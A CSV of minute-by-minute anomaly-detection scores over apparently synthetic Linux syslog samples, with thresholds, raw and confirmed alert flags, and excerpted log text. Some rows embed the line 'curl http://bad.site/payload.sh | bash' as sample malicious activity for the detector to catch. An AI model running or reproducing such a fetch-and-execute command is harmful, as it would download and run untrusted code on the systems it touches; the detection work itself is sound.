bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 18:30:00,0.9956388358896044,0,0,0.9999894441123176,3,59,rsyslogd: Finished Daily apt download activities. || sudo: Finished Daily apt download activities. || xinetd: Synced RTC time from system clock. || sshd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0
2026-07-01 18:31:00,0.987741457994167,0,0,0.9999894441123176,3,64,docker: Listening on LVM2 poll daemon socket. || ftpd: Rotating log files. || redis-server: Synced RTC time from system clock. || kernel: Started Session c103 of user root. || docker: Started CUPS Scheduler. || ufw: Started CUPS Scheduler. || cups: S
2026-07-01 18:32:00,0.9975984237685412,0,0,0.9999894441123176,3,59,redis-server: Synced RTC time from system clock. || sshd: Started Session c224 of user root. || rsyslogd: Accepted publickey for user from 10.0.0.99 port 22 ssh2. || sudo: Started Cleanup of Temporary Directories. || CRON: Synced RTC time from system
2026-07-01 18:33:00,0.999249126429748,0,0,0.9999894441123176,3,57,cups: Synced RTC time from system clock. || chronyd: Started Session c173 of user root. || chronyd: Listening on LVM2 poll daemon socket. || ufw: Listening on LVM2 poll daemon socket. || chronyd: Started Cleanup of Temporary Directories. || systemd: 
2026-07-01 18:34:00,0.999787583031554,0,0,0.9999894441123176,3,58,logrotate: Accepted publickey for user from 10.0.0.1 port 22 ssh2. || unattended-upgrades: Listening on LVM2 poll daemon socket. || xinetd: Started Session c224 of user root. || dockerd: Listening on LVM2 poll daemon socket. || sshd: Rotating log fil
2026-07-01 18:35:00,0.99765000440427,0,0,0.9999894441123176,3,60,systemd-timesyncd: Synced RTC time from system clock. || docker: Finished Daily apt download activities. || chronyd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || gpm: Rotating log files. || named
2026-07-01 18:36:00,0.9977608294397872,0,0,0.9999894441123176,3,60,gpm: Started CUPS Scheduler. || gpm: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || systemd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.12058 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || gpm: Synced RTC time from 
2026-07-01 18:37:00,0.9995662818631358,0,0,0.9999894441123176,3,55,redis-server: Started Cleanup of Temporary Directories. || xinetd: Started Cleanup of Temporary Directories. || telnetd: kernel: Out of memory: Kill process 3893 (python3) score 987 or sacrifice child || systemd: Started Cleanup of Temporary Director
2026-07-01 18:38:00,0.992270321677161,0,0,0.9999894441123176,3,57,unix_chkpwd: Listening on LVM2 poll daemon socket. || gpm: Started Session c51 of user root. || CRON: Started Session c117 of user root. || dockerd: Finished Daily apt download activities. || sshd: Started Session c24 of user root. || unix_chkpwd: Li
2026-07-01 18:39:00,0.9306479708822019,0,0,0.9999894441123176,3,62,unattended-upgrades: Started Cleanup of Temporary Directories. || systemd-timesyncd: kernel: Out of memory: Kill process 57538 (python3) score 987 or sacrifice child || redis-server: Finished Daily apt download activities. || ntpd: Started CUPS Sched
2026-07-01 18:40:00,0.9850790122833099,0,0,0.9999894441123176,3,62,ntpd: Started Session c100 of user root. || logrotate: Started Cleanup of Temporary Directories. || NetworkManager: Started CUPS Scheduler. || docker: Started Session c193 of user root. || xinetd: Synced RTC time from system clock. || unattended-upgr
2026-07-01 18:41:00,0.9936858769485849,0,0,0.9999894441123176,3,57,ufw: Accepted publickey for user from 10.0.0.19 port 22 ssh2. || cups: Finished Daily apt download activities. || redis-server: Started CUPS Scheduler. || CRON: Started Cleanup of Temporary Directories. || sshd: EXT4-fs error (device sda1): ext4_find
2026-07-01 18:42:00,0.9762645257468304,0,0,0.9999894441123176,3,63,CRON: Synced RTC time from system clock. || systemd-timesyncd: Synced RTC time from system clock. || xinetd: Synced RTC time from system clock. || dockerd: Rotating log files. || systemd-timesyncd: Rotating log files. || ntpd: Synced RTC time from sy
2026-07-01 18:43:00,0.9960979207710071,0,0,0.9999894441123176,3,64,CRON: Started CUPS Scheduler. || gpm: Started Cleanup of Temporary Directories. || gpm: Started Cleanup of Temporary Directories. || smartd: Synced RTC time from system clock. || ntpd: Finished Daily apt download activities. || named: Listening on LV
2026-07-01 18:44:00,0.9910594943663809,0,0,0.9999894441123176,3,54,gpm: Listening on LVM2 poll daemon socket. || ntpd: Started CUPS Scheduler. || docker: Started CUPS Scheduler. || logrotate: Synced RTC time from system clock. || systemd: Rotating log files. || unattended-upgrades: Started Cleanup of Temporary Direc
2026-07-01 18:45:00,0.9969478630644377,0,0,0.9999894441123176,3,63,redis-server: Accepted publickey for user from 10.0.0.144 port 22 ssh2. || ufw: Rotating log files. || rsyslogd: Started CUPS Scheduler. || systemd-timesyncd: Accepted publickey for user from 10.0.0.143 port 22 ssh2. || telnetd: Finished Daily apt do
2026-07-01 18:46:00,0.9881171742240491,0,0,0.9999894441123176,3,59,systemd-timesyncd: Accepted publickey for user from 10.0.0.135 port 22 ssh2. || dockerd: Finished Daily apt download activities. || kernel: Accepted publickey for user from 10.0.0.205 port 22 ssh2. || ufw: Started Cleanup of Temporary Directories. ||
2026-07-01 18:47:00,0.9483349369819867,0,0,0.9999894441123176,3,60,kernel: Finished Daily apt download activities. || ftpd: Accepted publickey for user from 10.0.0.18 port 22 ssh2. || chronyd: Started Session c112 of user root. || unattended-upgrades: Synced RTC time from system clock. || systemd-timesyncd: Rotating
2026-07-01 18:48:00,0.976175636585064,0,0,0.9999894441123176,3,64,ufw: Listening on LVM2 poll daemon socket. || chronyd: Finished Daily apt download activities. || docker: Synced RTC time from system clock. || named: Started Session c178 of user root. || chronyd: Accepted publickey for user from 10.0.0.102 port 22 
2026-07-01 18:49:00,0.9953545516515505,0,0,0.9999894441123176,3,56,chronyd: Started CUPS Scheduler. || sshd: Accepted publickey for user from 10.0.0.188 port 22 ssh2. || gpm: Started Session c120 of user root. || ntpd: Started CUPS Scheduler. || rsyslogd: Started Cleanup of Temporary Directories. || ntpd: Started CU
2026-07-01 18:50:00,0.9998656851012185,0,0,0.9999894441123176,3,65,ftpd: Started CUPS Scheduler. || redis-server: Started Session c81 of user root. || rsyslogd: Started Session c216 of user root. || CRON: Accepted publickey for user from 10.0.0.197 port 22 ssh2. || redis-server: Rotating log files. || unix_chkpwd: R
2026-07-01 18:51:00,0.9998263355392621,0,0,0.9999894441123176,3,59,CRON: Synced RTC time from system clock. || sudo: Rotating log files. || ntpd: Listening on LVM2 poll daemon socket. || ufw: Failed password for invalid user test from 192.168.1.31767 port 22 ssh2 || sshd: Synced RTC time from system clock. || chrony
2026-07-01 18:52:00,0.9996525466702139,0,0,0.9999894441123176,3,62,ftpd: Finished Daily apt download activities. || chronyd: Accepted publickey for user from 10.0.0.10 port 22 ssh2. || sshd: Listening on LVM2 poll daemon socket. || kernel: Synced RTC time from system clock. || unix_chkpwd: Started Cleanup of Tempora
2026-07-01 18:53:00,0.9993192216974858,0,0,0.9999894441123176,3,56,NetworkManager: Started Cleanup of Temporary Directories. || chronyd: Started Session c239 of user root. || named: Started CUPS Scheduler. || kernel: Finished Daily apt download activities. || xinetd: Started Session c88 of user root. || gpm: Synced 
2026-07-01 18:54:00,0.9989470300205185,0,0,0.9999894441123176,3,60,ntpd: Finished Daily apt download activities. || systemd-timesyncd: Rotating log files. || logrotate: Accepted publickey for user from 10.0.0.116 port 22 ssh2. || ntpd: Started CUPS Scheduler. || smartd: Finished Daily apt download activities. || doc
2026-07-01 18:55:00,0.993402251890595,0,0,0.9999894441123176,3,57,xinetd: Started Session c117 of user root. || unix_chkpwd: Listening on LVM2 poll daemon socket. || cups: Accepted publickey for user from 10.0.0.57 port 22 ssh2. || NetworkManager: Synced RTC time from system clock. || sshd: Started Session c58 of u
2026-07-01 18:56:00,0.9991117073714433,0,0,0.9999894441123176,3,62,redis-server: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started CUPS Scheduler. || xinetd: Started CUPS Scheduler. || rsyslogd: Started CUPS Scheduler. || systemd-timesyncd: bash: -c: line 1: curl http://bad.site/payload.sh | bash |
2026-07-01 18:57:00,0.9995737634640578,0,0,0.9999894441123176,3,57,kernel: Started CUPS Scheduler. || gpm: Synced RTC time from system clock. || xinetd: Started CUPS Scheduler. || sudo: Rotating log files. || named: Finished Daily apt download activities. || sshd: Finished Daily apt download activities. || logrotate
2026-07-01 18:58:00,0.9996183315272436,0,0,0.9999894441123176,3,60,systemd-timesyncd: Synced RTC time from system clock. || ufw: Started CUPS Scheduler. || systemd: Finished Daily apt download activities. || ntpd: Accepted publickey for user from 10.0.0.149 port 22 ssh2. || named: Accepted publickey for user from 10
2026-07-01 18:59:00,0.9999137284904288,0,0,0.9999894441123176,3,61,kernel: Rotating log files. || CRON: Listening on LVM2 poll daemon socket. || dockerd: Listening on LVM2 poll daemon socket. || dockerd: Synced RTC time from system clock. || xinetd: Finished Daily apt download activities. || cups: kernel: Kernel pan
2026-07-01 19:00:00,0.9999891774684248,0,0,0.9999894441123176,3,57,systemd-timesyncd: Finished Daily apt download activities. || named: Started Cleanup of Temporary Directories. || unix_chkpwd: Started CUPS Scheduler. || CRON: Listening on LVM2 poll daemon socket. || smartd: Synced RTC time from system clock. || una
2026-07-01 19:01:00,0.9999965702758371,1,0,0.9999894441123176,3,61,ftpd: Started Cleanup of Temporary Directories. || ftpd: Finished Daily apt download activities. || unattended-upgrades: Accepted publickey for user from 10.0.0.26 port 22 ssh2. || smartd: Started Cleanup of Temporary Directories. || named: Listening
2026-07-01 19:02:00,0.9999932610568887,1,0,0.9999894441123176,3,57,ftpd: Started Session c98 of user root. || ufw: Listening on LVM2 poll daemon socket. || logrotate: Rotating log files. || chronyd: Started Cleanup of Temporary Directories. || gpm: Accepted publickey for user from 10.0.0.120 port 22 ssh2. || unatten
2026-07-01 19:03:00,0.9998599752652294,0,0,0.9999894441123176,3,56,logrotate: Started CUPS Scheduler. || NetworkManager: Started Cleanup of Temporary Directories. || xinetd: Accepted publickey for user from 10.0.0.71 port 22 ssh2. || logrotate: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000]
2026-07-01 19:04:00,0.9867209409202171,0,0,0.9999894441123176,3,60,systemd-timesyncd: Started CUPS Scheduler. || kernel: Listening on LVM2 poll daemon socket. || cups: Started Session c58 of user root. || telnetd: Synced RTC time from system clock. || gpm: Synced RTC time from system clock. || cups: Accepted publick
2026-07-01 19:05:00,0.9995164604655544,0,0,0.9999894441123176,3,61,sudo: Synced RTC time from system clock. || unix_chkpwd: Started CUPS Scheduler. || ftpd: Synced RTC time from system clock. || dockerd: Started Cleanup of Temporary Directories. || cups: Finished Daily apt download activities. || ufw: bash: -c: line
2026-07-01 19:06:00,0.9938479422329588,0,0,0.9999894441123176,3,61,unattended-upgrades: Failed password for invalid user test from 192.168.1.43396 port 22 ssh2 || docker: Synced RTC time from system clock. || dockerd: Started CUPS Scheduler. || unattended-upgrades: Listening on LVM2 poll daemon socket. || named: Acc
2026-07-01 19:07:00,0.9958341257377094,0,0,0.9999894441123176,3,59,rsyslogd: Started CUPS Scheduler. || logrotate: Started CUPS Scheduler. || unix_chkpwd: Finished Daily apt download activities. || dockerd: Started CUPS Scheduler. || NetworkManager: Accepted publickey for user from 10.0.0.57 port 22 ssh2. || unix_ch
2026-07-01 19:08:00,0.995346870843148,0,0,0.9999894441123176,3,57,sudo: Rotating log files. || ntpd: Finished Daily apt download activities. || ftpd: Rotating log files. || ntpd: Rotating log files. || unattended-upgrades: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lbloc
2026-07-01 19:09:00,0.9980510285606596,0,0,0.9999894441123176,3,58,chronyd: Started CUPS Scheduler. || dockerd: Accepted publickey for user from 10.0.0.57 port 22 ssh2. || cups: Accepted publickey for user from 10.0.0.97 port 22 ssh2. || xinetd: Synced RTC time from system clock. || gpm: Listening on LVM2 poll daemo
2026-07-01 19:10:00,0.998238662610875,0,0,0.9999894441123176,3,59,unix_chkpwd: Started Cleanup of Temporary Directories. || CRON: Synced RTC time from system clock. || unix_chkpwd: Accepted publickey for user from 10.0.0.244 port 22 ssh2. || gpm: Started Cleanup of Temporary Directories. || unattended-upgrades: Sta
2026-07-01 19:11:00,0.997602179156676,0,0,0.9999894441123176,3,61,smartd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || ntpd: Listening on LVM2 poll daemon socket. || named: Synced RTC time from system clock. || ftpd: Started Cleanup of Temporary Directories. || CRON: Sta
2026-07-01 19:12:00,0.9975508452422782,0,0,0.9999894441123176,3,62,telnetd: Started Session c108 of user root. || NetworkManager: Accepted publickey for user from 10.0.0.157 port 22 ssh2. || cups: Started CUPS Scheduler. || systemd-timesyncd: Accepted publickey for user from 10.0.0.86 port 22 ssh2. || ntpd: Started 
2026-07-01 19:13:00,0.999587074152668,0,0,0.9999894441123176,3,66,kernel: Synced RTC time from system clock. || sshd: kernel: Out of memory: Kill process 58956 (python3) score 987 or sacrifice child || redis-server: Accepted publickey for user from 10.0.0.11 port 22 ssh2. || named: Accepted publickey for user from 
2026-07-01 19:14:00,0.9999281447937848,0,0,0.9999894441123176,3,61,dockerd: Accepted publickey for user from 10.0.0.116 port 22 ssh2. || sshd: Started Session c118 of user root. || unattended-upgrades: Accepted publickey for user from 10.0.0.42 port 22 ssh2. || rsyslogd: Started Session c48 of user root. || unattend
2026-07-01 19:15:00,0.9998342482393202,0,0,0.9999894441123176,3,61,logrotate: Rotating log files. || dockerd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || ufw: Listening on LVM2 poll daemon socket. || ufw: Started Cleanup of Temporary Directories. || smartd: Sta
2026-07-01 19:16:00,0.9986968107663075,0,0,0.9999894441123176,3,59,smartd: Started CUPS Scheduler. || unix_chkpwd: Accepted publickey for user from 10.0.0.27 port 22 ssh2. || smartd: Accepted publickey for user from 10.0.0.248 port 22 ssh2. || unix_chkpwd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || 
2026-07-01 19:17:00,0.9996939951749112,0,0,0.9999894441123176,3,59,gpm: Finished Daily apt download activities. || xinetd: Accepted publickey for user from 10.0.0.176 port 22 ssh2. || systemd: Rotating log files. || ntpd: Finished Daily apt download activities. || sshd: Rotating log files. || sudo: Rotating log file
2026-07-01 19:18:00,0.999728624597472,0,0,0.9999894441123176,3,59,sudo: Synced RTC time from system clock. || named: Rotating log files. || systemd: Accepted publickey for user from 10.0.0.227 port 22 ssh2. || NetworkManager: Synced RTC time from system clock. || NetworkManager: Listening on LVM2 poll daemon socket
2026-07-01 19:19:00,0.9998372612007046,0,0,0.9999894441123176,3,54,logrotate: Synced RTC time from system clock. || NetworkManager: Started Cleanup of Temporary Directories. || telnetd: Accepted publickey for user from 10.0.0.220 port 22 ssh2. || systemd: Started Session c51 of user root. || logrotate: Started Sessi
2026-07-01 19:20:00,0.9976427778068259,0,0,0.9999894441123176,3,56,ntpd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Rotating log files. || smartd: Started CUPS Scheduler. || gpm: Finished Daily apt download activities. || named: Started Session c194 of user root. || unix_chkpwd: Listening on LVM2 poll dae
2026-07-01 19:21:00,0.9958130587202495,0,0,0.9999894441123176,3,61,ufw: Listening on LVM2 poll daemon socket. || cups: Started Cleanup of Temporary Directories. || named: Accepted publickey for user from 10.0.0.147 port 22 ssh2. || CRON: Synced RTC time from system clock. || gpm: Started CUPS Scheduler. || ufw: Acce
2026-07-01 19:22:00,0.9980073047767477,0,0,0.9999894441123176,3,60,sshd: Started Cleanup of Temporary Directories. || cups: Synced RTC time from system clock. || kernel: Started Session c175 of user root. || smartd: Started CUPS Scheduler. || ufw: Started Cleanup of Temporary Directories. || ufw: Rotating log files.
2026-07-01 19:23:00,0.9910619321209816,0,0,0.9999894441123176,3,62,docker: Started Cleanup of Temporary Directories. || cups: Listening on LVM2 poll daemon socket. || sshd: Finished Daily apt download activities. || sshd: Finished Daily apt download activities. || sshd: Synced RTC time from system clock. || ufw: Sta
2026-07-01 19:24:00,0.9996034650231748,0,0,0.9999894441123176,3,61,redis-server: Finished Daily apt download activities. || dockerd: Started Cleanup of Temporary Directories. || sudo: Synced RTC time from system clock. || dockerd: Rotating log files. || chronyd: Started Cleanup of Temporary Directories. || logrotate
2026-07-01 19:25:00,0.9972564858344256,0,0,0.9999894441123176,3,61,kernel: Started CUPS Scheduler. || ufw: Started CUPS Scheduler. || unattended-upgrades: Started Cleanup of Temporary Directories. || ntpd: Finished Daily apt download activities. || gpm: Listening on LVM2 poll daemon socket. || unattended-upgrades: A
2026-07-01 19:26:00,0.9965140458786236,0,0,0.9999894441123176,3,60,systemd-timesyncd: Started Session c134 of user root. || systemd: Finished Daily apt download activities. || unix_chkpwd: Started CUPS Scheduler. || dockerd: Synced RTC time from system clock. || chronyd: Listening on LVM2 poll daemon socket. || logr
2026-07-01 19:27:00,0.9918579375668634,0,0,0.9999894441123176,3,58,ufw: Started CUPS Scheduler. || gpm: Started Session c180 of user root. || named: Started CUPS Scheduler. || sudo: Finished Daily apt download activities. || dockerd: Listening on LVM2 poll daemon socket. || systemd: Finished Daily apt download activ
2026-07-01 19:28:00,0.9995032665862569,0,0,0.9999894441123176,3,59,xinetd: Started CUPS Scheduler. || smartd: Started CUPS Scheduler. || CRON: Started Session c211 of user root. || rsyslogd: kernel: Kernel panic - not syncing: Fatal exception || redis-server: Started Cleanup of Temporary Directories. || rsyslogd: St
2026-07-01 19:29:00,0.999360578364685,0,0,0.9999894441123176,3,61,CRON: Listening on LVM2 poll daemon socket. || dockerd: Rotating log files. || ntpd: Finished Daily apt download activities. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || logrotate: Accepted publickey for user from 10.0.0.194 port 22
2026-07-01 19:30:00,0.9999486586646267,0,0,0.9999894441123176,3,58,systemd-timesyncd: Rotating log files. || ufw: Finished Daily apt download activities. || unattended-upgrades: Started Cleanup of Temporary Directories. || unattended-upgrades: Started Cleanup of Temporary Directories. || systemd-timesyncd: Started C
2026-07-01 19:31:00,0.9993486617218049,0,0,0.9999894441123176,3,59,smartd: Listening on LVM2 poll daemon socket. || dockerd: Started Session c84 of user root. || ufw: Synced RTC time from system clock. || chronyd: Started Session c197 of user root. || redis-server: Started Cleanup of Temporary Directories. || ntpd: 
2026-07-01 19:32:00,0.998878793544749,0,0,0.9999894441123176,3,60,CRON: Started CUPS Scheduler. || smartd: Finished Daily apt download activities. || gpm: kernel: Kernel panic - not syncing: Fatal exception || sshd: Accepted publickey for user from 10.0.0.249 port 22 ssh2. || telnetd: Finished Daily apt download ac
2026-07-01 19:33:00,0.9983153799160172,0,0,0.9999894441123176,3,58,cups: Failed password for invalid user test from 192.168.1.6280 port 22 ssh2 || logrotate: Listening on LVM2 poll daemon socket. || xinetd: Rotating log files. || logrotate: Failed password for invalid user test from 192.168.1.63540 port 22 ssh2 || d
2026-07-01 19:34:00,0.9944027261114279,0,0,0.9999894441123176,3,60,unattended-upgrades: Started CUPS Scheduler. || NetworkManager: Started CUPS Scheduler. || logrotate: Synced RTC time from system clock. || chronyd: Synced RTC time from system clock. || sshd: Started Session c102 of user root. || NetworkManager: Rot
2026-07-01 19:35:00,0.9985459781824761,0,0,0.9999894441123176,3,56,unattended-upgrades: Started Cleanup of Temporary Directories. || chronyd: kernel: Out of memory: Kill process 27438 (python3) score 987 or sacrifice child || docker: Rotating log files. || docker: Accepted publickey for user from 10.0.0.161 port 22 
2026-07-01 19:36:00,0.9997401321732213,0,0,0.9999894441123176,3,59,sshd: Started Cleanup of Temporary Directories. || sshd: Started CUPS Scheduler. || docker: Rotating log files. || NetworkManager: Synced RTC time from system clock. || NetworkManager: Accepted publickey for user from 10.0.0.28 port 22 ssh2. || docke
2026-07-01 19:37:00,0.9999733980881345,0,0,0.9999894441123176,3,59,logrotate: Finished Daily apt download activities. || CRON: Started CUPS Scheduler. || telnetd: Synced RTC time from system clock. || unattended-upgrades: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.26411 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || 
2026-07-01 19:38:00,0.999264908308164,0,0,0.9999894441123176,3,58,named: Rotating log files. || unattended-upgrades: Started Cleanup of Temporary Directories. || gpm: Started CUPS Scheduler. || telnetd: Listening on LVM2 poll daemon socket. || systemd: Synced RTC time from system clock. || smartd: Rotating log file
2026-07-01 19:39:00,0.9998684187258865,0,0,0.9999894441123176,3,56,chronyd: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || named: Synced RTC time from system clock. || telnetd: Listening on LVM2 poll daemon socket. || systemd: Started Session c225 of user root. || chronyd: Finishe
2026-07-01 19:40:00,0.9997790899752129,0,0,0.9999894441123176,3,60,systemd: Accepted publickey for user from 10.0.0.70 port 22 ssh2. || NetworkManager: Finished Daily apt download activities. || gpm: Finished Daily apt download activities. || xinetd: Started Cleanup of Temporary Directories. || ftpd: Accepted public
2026-07-01 19:41:00,0.9979993633009635,0,0,0.9999894441123176,3,57,ntpd: Started CUPS Scheduler. || chronyd: Started Session c222 of user root. || cups: Listening on LVM2 poll daemon socket. || telnetd: Started CUPS Scheduler. || systemd: Listening on LVM2 poll daemon socket. || ftpd: Finished Daily apt download act
2026-07-01 19:42:00,0.9988715486406716,0,0,0.9999894441123176,3,56,ufw: Finished Daily apt download activities. || named: Listening on LVM2 poll daemon socket. || sudo: Started Session c75 of user root. || sudo: Synced RTC time from system clock. || ufw: Listening on LVM2 poll daemon socket. || sudo: Started Session
2026-07-01 19:43:00,0.9997153417994882,0,0,0.9999894441123176,3,59,xinetd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || smartd: Listening on LVM2 poll daemon socket. || dockerd: Synced RTC time from system clock. || ftpd: Started CUPS Scheduler. || unix_chkpwd: 
2026-07-01 19:44:00,0.9999704833234802,0,0,0.9999894441123176,3,63,unattended-upgrades: Listening on LVM2 poll daemon socket. || unattended-upgrades: kernel: Out of memory: Kill process 60628 (python3) score 987 or sacrifice child || docker: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (c
2026-07-01 19:45:00,0.9999960638366202,1,0,0.9999894441123176,3,61,NetworkManager: Started Session c77 of user root. || logrotate: Rotating log files. || logrotate: Finished Daily apt download activities. || ntpd: Started Cleanup of Temporary Directories. || redis-server: Synced RTC time from system clock. || ufw: A
2026-07-01 19:46:00,0.9995989968699688,0,0,0.9999894441123176,3,57,telnetd: Started Cleanup of Temporary Directories. || CRON: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || telnetd: Listening on LVM2 poll daemon socket. || rsyslogd: Started Session c84 of user root. || kernel: Ac
2026-07-01 19:47:00,0.9995016398407425,0,0,0.9999894441123176,3,63,sudo: Synced RTC time from system clock. || xinetd: Finished Daily apt download activities. || named: Started Cleanup of Temporary Directories. || NetworkManager: Accepted publickey for user from 10.0.0.80 port 22 ssh2. || systemd-timesyncd: Rotating
2026-07-01 19:48:00,0.9995736769192121,0,0,0.9999894441123176,3,55,NetworkManager: Accepted publickey for user from 10.0.0.218 port 22 ssh2. || systemd-timesyncd: Started Session c50 of user root. || ftpd: Finished Daily apt download activities. || systemd: Started Session c37 of user root. || NetworkManager: Rotati
2026-07-01 19:49:00,0.9992085267639619,0,0,0.9999894441123176,3,60,dockerd: Started Cleanup of Temporary Directories. || redis-server: Started CUPS Scheduler. || logrotate: Synced RTC time from system clock. || cups: Synced RTC time from system clock. || named: Started Session c42 of user root. || CRON: Accepted pub
2026-07-01 19:50:00,0.9939704695911468,0,0,0.9999894441123176,3,58,cups: Synced RTC time from system clock. || ftpd: Synced RTC time from system clock. || redis-server: Accepted publickey for user from 10.0.0.51 port 22 ssh2. || logrotate: Started Session c185 of user root. || sshd: Synced RTC time from system clock
2026-07-01 19:51:00,0.9983046553382448,0,0,0.9999894441123176,3,60,ufw: Finished Daily apt download activities. || ufw: Started Cleanup of Temporary Directories. || unix_chkpwd: Accepted publickey for user from 10.0.0.134 port 22 ssh2. || logrotate: Listening on LVM2 poll daemon socket. || ftpd: Rotating log files. 
2026-07-01 19:52:00,0.9998865845980237,0,0,0.9999894441123176,3,61,systemd-timesyncd: Rotating log files. || ftpd: Finished Daily apt download activities. || unattended-upgrades: Started CUPS Scheduler. || ufw: Synced RTC time from system clock. || docker: Started Session c24 of user root. || gpm: Listening on LVM2 
2026-07-01 19:53:00,0.999630418006138,0,0,0.9999894441123176,3,60,CRON: Started CUPS Scheduler. || ftpd: Accepted publickey for user from 10.0.0.249 port 22 ssh2. || logrotate: Started Cleanup of Temporary Directories. || telnetd: Started Cleanup of Temporary Directories. || chronyd: Accepted publickey for user fro
2026-07-01 19:54:00,0.997986321226504,0,0,0.9999894441123176,3,61,sshd: Finished Daily apt download activities. || gpm: Listening on LVM2 poll daemon socket. || unattended-upgrades: Started CUPS Scheduler. || ftpd: Started CUPS Scheduler. || dockerd: Started Session c88 of user root. || ntpd: Started Cleanup of Tem
2026-07-01 19:55:00,0.9993681732549875,0,0,0.9999894441123176,3,61,rsyslogd: Finished Daily apt download activities. || logrotate: Finished Daily apt download activities. || xinetd: Started Cleanup of Temporary Directories. || xinetd: Started CUPS Scheduler. || xinetd: Started Session c12 of user root. || ufw: app[1
2026-07-01 19:56:00,0.9998559174473098,0,0,0.9999894441123176,3,55,xinetd: Listening on LVM2 poll daemon socket. || cups: Failed password for invalid user test from 192.168.1.9004 port 22 ssh2 || sudo: Accepted publickey for user from 10.0.0.55 port 22 ssh2. || telnetd: Accepted publickey for user from 10.0.0.182 po
2026-07-01 19:57:00,0.999979014117342,0,0,0.9999894441123176,3,61,CRON: Synced RTC time from system clock. || chronyd: Started Cleanup of Temporary Directories. || rsyslogd: Accepted publickey for user from 10.0.0.252 port 22 ssh2. || NetworkManager: Accepted publickey for user from 10.0.0.81 port 22 ssh2. || Netwo
2026-07-01 19:58:00,0.999821165548336,0,0,0.9999894441123176,3,61,dockerd: Synced RTC time from system clock. || chronyd: Started CUPS Scheduler. || dockerd: Started CUPS Scheduler. || docker: Started Cleanup of Temporary Directories. || ufw: Finished Daily apt download activities. || kernel: Rotating log files. ||
2026-07-01 19:59:00,0.9997497099042147,0,0,0.9999894441123176,3,59,unattended-upgrades: Synced RTC time from system clock. || smartd: Listening on LVM2 poll daemon socket. || ntpd: Synced RTC time from system clock. || telnetd: Rotating log files. || gpm: Listening on LVM2 poll daemon socket. || unattended-upgrades:
2026-07-01 20:00:00,0.999873417141925,0,0,0.9999894441123176,3,61,CRON: Synced RTC time from system clock. || logrotate: Accepted publickey for user from 10.0.0.16 port 22 ssh2. || unattended-upgrades: Listening on LVM2 poll daemon socket. || systemd: Finished Daily apt download activities. || systemd: Started Sess
2026-07-01 20:01:00,0.9985808798530053,0,0,0.9999894441123176,3,56,telnetd: Finished Daily apt download activities. || kernel: Listening on LVM2 poll daemon socket. || sshd: Rotating log files. || redis-server: Started Cleanup of Temporary Directories. || dockerd: Started Cleanup of Temporary Directories. || xinetd:
2026-07-01 20:02:00,0.9829241041863529,0,0,0.9999894441123176,3,59,ufw: Accepted publickey for user from 10.0.0.28 port 22 ssh2. || dockerd: Finished Daily apt download activities. || dockerd: Started Cleanup of Temporary Directories. || systemd: Finished Daily apt download activities. || rsyslogd: bash: -c: line 1:
2026-07-01 20:03:00,0.9445962360797239,0,0,0.9999894441123176,3,58,telnetd: Started Cleanup of Temporary Directories. || ufw: Started Session c234 of user root. || kernel: Started Session c71 of user root. || unattended-upgrades: Accepted publickey for user from 10.0.0.209 port 22 ssh2. || ftpd: Started Cleanup of T
